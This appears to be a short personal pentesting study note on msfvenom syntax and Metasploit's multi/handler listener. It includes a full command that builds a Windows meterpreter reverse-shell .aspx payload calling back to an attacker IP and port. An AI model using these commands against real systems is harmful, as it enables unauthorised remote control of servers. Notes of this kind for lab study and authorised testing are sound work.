syntax
```
msfvenom -p <metlasploit-payload> OPTION1 OPTION2 -f <file type> > shell.<file_type>
```

.aspx reverse shell example:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
---
## listener

in msf console we can setup a listener waiting for connections instead of just using nc, 
but if we use meterpreter payloads we that handler to get the connection

multi/handler - generic payload handler
```
use multi/handler
```
```
set LHOST <interface>/<ip>
```
```
set LPORT <port>
```
---
related notes:
[[firewall_AV_IDS_IPS]]